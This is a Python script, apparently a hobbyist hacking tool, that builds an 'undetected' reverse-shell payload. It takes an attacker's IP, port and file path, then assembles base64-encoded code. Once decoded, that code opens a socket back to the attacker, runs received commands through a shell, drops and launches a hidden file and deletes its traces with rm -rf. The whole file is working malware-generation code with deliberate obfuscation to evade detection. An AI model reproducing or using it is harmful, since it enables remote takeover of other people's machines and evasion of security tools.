import os
import time
import base64
from colorama import Fore


########################################
#     Most undetected Paload By        #
#            Banana j00e               #
########################################

os.system("clear")





print (Fore.WHITE + """


         _
        /.)
       /)\|
      // /    Be A Crow
     /'" "



------------------------------------------------


""")




first_part= "aW1wb3J0IHRpbWUKaW1wb3J0IGJhc2U2NAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgb3MK"
end_part= """Cm5hbWUgPSAiLnNlY3JldGUiCmlwcCA9IGJhc2U2NC5iNjRkZWNvZGUoaXApCmlwaGFzaCA9ICAo
aXBwLmRlY29kZSgpKQpwb3J0dCA9IGJhc2U2NC5iNjRkZWNvZGUocG9ydCkKcG9ydGhhc2ggPSAg
KHBvcnR0LmRlY29kZSgpKQpzaGVsbCA9ICJzLmNvbm5lY3QoKCIgKyBpcGhhc2ggKyAiLCIgKyBw
b3J0aGFzaCArIikpIgpjd2QgPSBvcy5nZXRjd2QoKQpzZWNyID0gb3BlbigiLnNlY3JldGUiLCJ3
KyIpCnNlY3Iud3JpdGUoc2hlbGwpCnNlY3IuY2xvc2UoKQp4eCA9ICgiYVcxd2IzSjBJSE52WTJ0
bGRBcHBiWEJ2Y25RZ2MzVmljSEp2WTJWemN3cHpQWE52WTJ0bGRDNXpiMk5yWlhRb0tRPT0iKQp4
ID0gYmFzZTY0LmI2NGRlY29kZSh4eCkKcGF5bG9hZCA9ICAoeC5kZWNvZGUoKSkKeHh4ID0gKCJk
MmhwYkdVZ1ZISjFaVG9LSUNBZ0lDQndjbTlqSUQwZ2MzVmljSEp2WTJWemN5NVFiM0JsYmloekxu
SmxZM1lvTVRBeU5Da3NJQ0J6YUdWc2JEMVVjblZsTEhOMFpHOTFkRDF6ZFdKd2NtOWpaWE56TGxC
SlVFVXNJSE4wWkdWeWNqMXpkV0p3Y205alpYTnpMbEJKVUVVc0lITjBaR2x1UFhOMVluQnliMk5s
YzNNdVVFbFFSU2tLSUNBZ0lDQnpMbk5sYm1Rb2NISnZZeTV6ZEdSdmRYUXVjbVZoWkNncElDc2dj
SEp2WXk1emRHUmxjbkl1Y21WaFpDZ3BLUT09IikKeHggPSBiYXNlNjQuYjY0ZGVjb2RlKHh4eCkK
cGF5bG9hZDIgPSAgKHh4LmRlY29kZSgpKQpmaWxlID0gb3BlbigiLnNlY3JldGUiLCJyIikKZmls
bGUgPSBmaWxlLnJlYWQoKQpmaWxlLmNsb3NlKCkKZmlsZV9vYmplY3QgPSBvcGVuKG5hbWUsIncr
IikKZmlsZV9vYmplY3Qud3JpdGUoc3RyKHBheWxvYWQpKQpmaWxlX29iamVjdC53cml0ZSgiXG4i
KQpmaWxlX29iamVjdC53cml0ZShmaWxsZSkKZmlsZV9vYmplY3Qud3JpdGUoIlxuIikKZmlsZV9v
YmplY3Qud3JpdGUocGF5bG9hZDIpCmZpbGVfb2JqZWN0LmNsb3NlKCkKb3Blbm4gPSAoInB5dGhv
bjMgIiArIGN3ZCArICIvIiArIG5hbWUgKyAiICAmIikKc3VwID0gKCJybSAtcmYgIiArIGN3ZCAr
ICIvIiArIG5hbWUpCnN1cDIgPSAoInJtIC1yZiAiICsgY3dkICsgIi8uc2VjcmV0ZSIpCm9zLnN5
c3RlbShvcGVubikKdGltZS5zbGVlcCgxKQpvcy5zeXN0ZW0oc3VwKQpvcy5zeXN0ZW0oc3VwMikK"""


ip = input (Fore.RED + "Enter Your Local Ip : ")
ipp = ('"' + ip + '"')


print (Fore.WHITE +"[" +Fore.RED +"*" +  Fore.WHITE +"]" + Fore.WHITE + " Your Local Ip is : " + ip)

port = input (Fore.RED + "Enter Your Local Port : ")
print (Fore.WHITE +"[" +Fore.RED +"*" +  Fore.WHITE +"]" + Fore.WHITE + " Your Local Port is : " + port)

payloa = input (Fore.RED + "Enter The Name Of the payload : ")
print (Fore.WHITE +"[" +Fore.RED +"*" +  Fore.WHITE +"]" + Fore.WHITE +  " Your Payload Name is : " + payloa)
pat = input (Fore.RED + "[*] Enter Paylaod Path : ")
path = ("/" + pat + "/")
payload = ('"' + payloa + '"')


iphashed1 = ipp.encode('utf-8')
iphashed2 = base64.b64encode(iphashed1)
iphashed = iphashed2.decode('utf-8')

porthashed1 = port.encode('utf-8')
porthashed2 = base64.b64encode(porthashed1)
porthashed = porthashed2.decode('utf-8')





first = base64.b64decode(first_part)
modules = (first.decode())


end = base64.b64decode(end_part)
endd = (end.decode())



first_line = ("ip = " +'"' + iphashed + '"' )
second_line = ("port = " +'"' + porthashed + '"' )

##########################modules############
##################ip and port################
##################endd###################


first_type = open(path + payloa,"w+")
first_type.write(modules)
first_type.write("\n")
first_type.write(first_line)
first_type.write("\n")
first_type.write(second_line)
first_type.write("\n")
first_type.write(endd)
first_type.close()

apt = (path + "/" + payloa + ".py")
apt2 = (path + "/" + payloa )



payloo = open(apt2,"r")
has = payloo.read()

ha = has.encode('utf-8')
haa = base64.b64encode(ha)
hash = haa.decode('utf-8')

os.system("clear")
time.sleep(3)
print (Fore.WHITE +"[" +Fore.RED +"*" +  Fore.WHITE +"]" + Fore.WHITE + " Building Creds")
time.sleep(1.5)
print (Fore.WHITE +"[" +Fore.RED +"*" +  Fore.WHITE +"]" + Fore.WHITE + " Building Payload " )
time.sleep(2)
print (Fore.WHITE +"[" +Fore.RED +"*" +  Fore.WHITE +"]" + Fore.WHITE + " Creating Payload ")
time.sleep(2)
os.system("clear")

hashing = open(apt,"w+")
hashing.write("import os ")
hashing.write("\n")
hashing.write("import base64")
hashing.write("\n")
hashing.write("x = ('''")
time.sleep(2)

hashing.write(hash)



time.sleep(2)
hashing.write("''')")
hashing.write("\n")
hashing.write("cwd = os.getcwd()")
hashing.write("\n")
hashing.write("path = (cwd + '/' + '.play')")
hashing.write("\n")
hashing.write("decode = base64.b64decode(x)")
hashing.write("\n")
hashing.write("final = (decode.decode())")
hashing.write("\n")
hashing.write("file = open(path,'w+')")
hashing.write("\n")
hashing.write("file.write(final)")
hashing.write("\n")
hashing.write("file.close()")
hashing.write("\n")
hashing.write("playyy = ('python3 ' +path)")
hashing.write("\n")
hashing.write("clear = ('rm -rf ' + path)")
hashing.write("\n")
hashing.write("os.system(playyy)")
hashing.write("\n")
hashing.write("os.system(clear)")
hashing.close()

print (Fore.WHITE +"[" +Fore.RED +"*" +  Fore.WHITE +"]" + Fore.WHITE + "The Payload Path : " + apt)
print (Fore.GREEN + "Info " + Fore.WHITE + ":  This Python Payload Cant Change To EXE !")

#############Debug#####################
current  = ("rm -rf " + path + payloa )
os.system(current)

# add # to current For Debug
